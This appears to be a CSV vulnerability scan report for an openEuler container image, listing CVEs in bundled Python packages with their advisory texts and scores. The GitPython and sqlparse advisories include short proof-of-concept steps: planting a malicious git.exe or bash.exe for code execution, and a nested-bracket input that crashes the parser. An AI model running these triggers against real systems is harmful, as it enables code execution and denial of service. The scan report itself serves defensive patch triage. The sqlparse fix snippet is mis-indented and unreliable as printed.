https://harbor.archeros.cn/dev/arstack/openstack-3.0/openeuler-binary-araccel-agent:aarch64_3.0.0.65 | Image Id: eff0bfe5cccb759da7a35733edb72dbe7118412e43abd6bf1c03c9f6cfd051b1 | CVE数据库版本: 3.582 | DB创建时间: Oct 11  2024 09:24:36 | OS: openeuler:22.03
cves,description,feed_rating,fixed_version,in_base_image,last_modified_timestamp,link,name,package_name,package_version,published_timestamp,score,score_v3,severity,vectors,vectors_v3,tags
"CVE-2024-22190","Untrusted search path under some conditions on Windows allows arbitrary code execution
### Summary

This issue exists because of an incomplete fix for CVE-2023-40590. On Windows, GitPython uses an untrusted search path if it uses a shell to run `git`, as well as when it runs `bash.exe` to interpret hooks. If either of those features are used on Windows, a malicious `git.exe` or `bash.exe` may be run from an untrusted repository.

### Details

Although GitPython often avoids executing programs found in an untrusted search path since 3.1.33, two situations remain where this still occurs. Either can allow arbitrary code execution under some circumstances.

#### When a shell is used

GitPython can be told to run `git` commands through a shell rather than as direct subprocesses, by passing `shell=True` to any method that accepts it, or by both setting `Git.USE_SHELL = True` and not passing `shell=False`. Then the Windows `cmd.exe` shell process performs the path search, and GitPython does not prevent that shell from finding and running `git` in the current directory.

When GitPython runs `git` directly rather than through a shell, the GitPython process performs the path search, and currently omits the current directory by setting `NoDefaultCurrentDirectoryInExePath` in its own environment during the `Popen` call. Although the `cmd.exe` shell will honor this environment variable when present, GitPython does not currently pass it into the shell subprocess's environment.

Furthermore, because GitPython sets the subprocess CWD to the root of a repository's working tree, using a shell will run a malicious `git.exe` in an untrusted repository even if GitPython itself is run from a trusted location.

This also applies if `Git.execute` is called directly with `shell=True` (or after `Git.USE_SHELL = True`) to run any command.

#### When hook scripts are run

On Windows, GitPython uses `bash.exe` to run hooks that appear to be scripts. However, unlike when running `git`, no steps are taken to avoid finding and running `bash.exe` in the current directory.

This allows the author of an untrusted fork or branch to cause a malicious `bash.exe` to be run in some otherwise safe workflows. An example of such a scenario is if the user installs a trusted hook while on a trusted branch, then switches to an untrusted feature branch (possibly from a fork) to review proposed changes. If the untrusted feature branch contains a malicious `bash.exe` and the user's current working directory is the working tree, and the user performs an action that runs the hook, then although the hook itself is uncorrupted, it runs with the malicious `bash.exe`.

Note that, while `bash.exe` is a shell, this is a separate scenario from when `git` is run using the unrelated Windows `cmd.exe` shell.

### PoC

On Windows, create a `git.exe` file in a repository. Then create a `Repo` object, and call any method through it (directly or indirectly) that supports the `shell` keyword argument with `shell=True`:

```powershell
mkdir testrepo
git init testrepo
cp ... testrepo git.exe # Replace '...' with any executable of choice.
python -c 'import git; print(git.Repo('testrepo').git.version(shell=True))'
```

The `git.exe` executable in the repository directory will be run.

Or use no `Repo` object, but do it from the location with the `git.exe`:

```powershell
cd testrepo
python -c 'import git; print(git.Git().version(shell=True))'
```

The `git.exe` executable in the current directory will be run.

For the scenario with hooks, install a hook in a repository, create a `bash.exe` file in the current directory, and perform an operation that causes GitPython to attempt to run the hook:

```powershell
mkdir testrepo
cd testrepo
git init
mv .git/hooks/pre-commit.sample .git/hooks/pre-commit
cp ... bash.exe # Replace '...' with any executable of choice.
echo 'Some text' >file.txt
git add file.txt
python -c 'import git; git.Repo().index.commit('Some message')'
```

The `bash.exe` executable in the current directory will be run.

### Impact

The greatest impact is probably in applications that set `Git.USE_SHELL = True` for historical reasons. (Undesired console windows had, in the past, been created in some kinds of applications, when it was not used.) Such an application may be vulnerable to arbitrary code execution from a malicious repository, even with no other exacerbating conditions. This is to say that, if a shell is used to run `git`, the full effect of CVE-2023-40590 is still present. Furthermore, as noted above, running the application itself from a trusted directory is not a sufficient mitigation.

An application that does not direct GitPython to use a shell to run `git` subprocesses thus avoids most of the risk. However, there is no such straightforward way to prevent GitPython from running `bash.exe` to interpret hooks. So while the conditions needed for that to be exploited are more involved, it may be harder to mitigate decisively prior to patching.

### Possible solutions

A straightforward approach would be to address each bug directly:

- When a shell is used, pass `NoDefaultCurrentDirectoryInExePath` into the subprocess environment, because in that scenario the subprocess is the `cmd.exe` shell that itself performs the path search.
- Set `NoDefaultCurrentDirectoryInExePath` in the GitPython process environment during the `Popen` call made to run hooks with a `bash.exe` subprocess.

These need only be done on Windows.
","High","3.1.41","false","Sat Sep 21 2024 05:04:20 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-2mqj-m65w-jghx","CVE-2024-22190","usr/lib/python3.9/site-packages/GitPython-3.1.32-py3.9","3.1.32","Wed Jan 10 2024 23:46:00 GMT+0800 (中国标准时间)","7","7.8","High","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",""
"CVE-2024-39689","Certifi removes GLOBALTRUST root certificate
Certifi 2024.07.04 removes root certificates from 'GLOBALTRUST' from the root store. These are in the process of being removed from Mozilla's trust store.

GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified 'long-running and unresolved compliance issues'. Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI).
","High","2024.07.04","false","Mon Jul 08 2024 23:38:32 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-248v-346w-9cwc","CVE-2024-39689","usr/lib/python3.9/site-packages/certifi-2023.7.22-py3.9","2023.7.22","Sat Jul 06 2024 04:06:40 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2022-40899","Python Charmers Future denial of service vulnerability
An issue discovered in Python Charmers Future 0.18.2 and earlier allows remote attackers to cause a denial of service via crafted Set-Cookie header from malicious web server. This issue has been patched in version 0.18.3.
","High","0.18.3","false","Sat Sep 21 2024 04:10:18 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-v3c5-jqr6-7qm8","CVE-2022-40899","usr/lib/python3.9/site-packages/future-0.18.2-py3.9","0.18.2","Fri Dec 23 2022 08:30:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2021-22570","NULL Pointer Dereference in Protocol Buffers
Nullptr dereference when a null char is present in a proto symbol. The symbol is parsed incorrectly, leading to an unchecked call into the proto file's name during generation of the resulting error message. Since the symbol is incorrectly parsed, the file is nullptr. We recommend upgrading to version 3.15.0 or greater.
","High","3.15.0","false","Wed Aug 16 2023 13:02:15 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-77rm-9x9h-xj3g","CVE-2021-22570","usr/lib/python3.9/site-packages/protobuf-3.14.0-py3.9","3.14.0","Thu Jan 27 2022 08:01:15 GMT+0800 (中国标准时间)","2.1","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-1941","protobuf-cpp and protobuf-python have potential Denial of Service issue
### Summary

A message parsing and memory management vulnerability in ProtocolBuffer’s C++ and Python implementations can trigger an out of memory (OOM) failure when processing a specially crafted message, which could lead to a denial of service (DoS) on services using the libraries.

Reporter: [ClusterFuzz](https://google.github.io/clusterfuzz/)

Affected versions: All versions of C++ Protobufs (including Python) prior to the versions listed below.

### Severity & Impact
As scored by google  
**Medium 5.7** - [CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)  
Asscored byt NIST  
**High 7.5** - [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

A small (~500 KB) malicious payload can be constructed which causes the running service to allocate more than 3GB of RAM.

### Proof of Concept

For reproduction details, please refer to the unit test that identifies the specific inputs that exercise this parsing weakness.

### Mitigation / Patching

Please update to the latest available versions of the following packages:
- protobuf-cpp (3.18.3, 3.19.5, 3.20.2, 3.21.6)
- protobuf-python (3.18.3, 3.19.5, 3.20.2, 4.21.6)
","High","3.18.3;3.19.5;3.20.2;4.21.6","false","Sat Jul 06 2024 05:23:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-8gq9-2x98-w8hf","CVE-2022-1941","usr/lib/python3.9/site-packages/protobuf-3.14.0-py3.9","3.14.0","Sat Sep 24 2022 04:31:15 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-42969","ReDoS in py library when used with subversion 
The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.

The particular codepath in question is the regular expression at `py._path.svnurl.InfoSvnCommand.lspattern` and is only relevant when dealing with subversion (svn) projects. Notably the codepath is not used in the popular pytest project. The developers of the pytest package have released version `7.2.0` which removes their dependency on `py`. Users of `pytest` seeing alerts relating to this advisory may update to version `7.2.0` of `pytest` to resolve this issue. See https://github.com/pytest-dev/py/issues/287#issuecomment-1290407715 for additional context.
","High",">1.11.0","false","Thu Aug 17 2023 13:01:50 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-w596-4wvx-j9j6","CVE-2022-42969","usr/lib/python3.9/site-packages/py-1.11.0-py3.9","1.11.0","Sun Oct 16 2022 20:00:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-6345","setuptools vulnerable to Command Injection via package URL
A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.
","High","70.0.0","false","Sun Aug 04 2024 13:03:40 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cx63-2mw6-8hw5","CVE-2024-6345","usr/lib/python3.9/site-packages/setuptools-59.4.0","59.4.0","Mon Jul 15 2024 11:30:57 GMT+0800 (中国标准时间)","7","8.8","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",""
"CVE-2022-40897","pypa/setuptools vulnerable to Regular Expression Denial of Service (ReDoS)
Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
","High","65.5.1","false","Tue Jun 25 2024 05:24:10 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-r9hx-vwmv-q579","CVE-2022-40897","usr/lib/python3.9/site-packages/setuptools-59.4.0","59.4.0","Fri Dec 23 2022 08:30:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"","Duplicate Advisory: sqlparse parsing heavily nested list leads to Denial of Service
## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2m57-hf25-phgg. This link is maintained to preserve external references.

## Original Description
Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.
","High","0.5.0","false","Wed May 01 2024 19:08:48 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-62qf-jcq8-8gxw","GHSA-62qf-jcq8-8gxw","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Tue Apr 30 2024 23:30:38 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-4340","sqlparse parsing heavily nested list leads to Denial of Service
### Summary
Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.

### Details + PoC
Running the following code will raise Maximum recursion limit exceeded exception:
```py
import sqlparse
sqlparse.parse('[' * 10000 + ']' * 10000)
```
We expect a traceback of RecursionError:
```py
Traceback (most recent call last):
  File 'trigger_sqlparse_nested_list.py', line 3, in <module>
    sqlparse.parse('[' * 10000 + ']' * 10000)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/__init__.py', line 30, in parse
    return tuple(parsestream(sql, encoding))
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/filter_stack.py', line 36, in run
    stmt = grouping.group(stmt)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 428, in group
    func(stmt)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 53, in group_brackets
    _group_matching(tlist, sql.SquareBrackets)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 48, in _group_matching
    tlist.group_tokens(cls, open_idx, close_idx)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 328, in group_tokens
    grp = grp_cls(subtokens)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 161, in __init__
    super().__init__(None, str(self))
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 165, in __str__
    return ''.join(token.value for token in self.flatten())
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 165, in <genexpr>
    return ''.join(token.value for token in self.flatten())
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  [Previous line repeated 983 more times]
RecursionError: maximum recursion depth exceeded
```

### Fix suggestion
The [flatten()](https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/sql.py#L207) function of TokenList class should limit the recursion to a maximal depth:
```py
from sqlparse.exceptions import SQLParseError

MAX_DEPTH = 100

    def flatten(self, depth=1):
        '''Generator yielding ungrouped tokens.

        This method is recursively called for all child tokens.
        '''
    if depth >= MAX_DEPTH:
        raise SQLParseError('Maximal depth reached')
        for token in self.tokens:
            if token.is_group:
                yield from token.flatten(depth + 1)
            else:
                yield token
```

### Impact
Denial of Service (the impact depends on the use).
Anyone parsing a user input with sqlparse.parse() is affected.

","High","0.5.0","false","Wed May 01 2024 19:09:13 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-2m57-hf25-phgg","CVE-2024-4340","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Tue Apr 16 2024 04:21:25 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
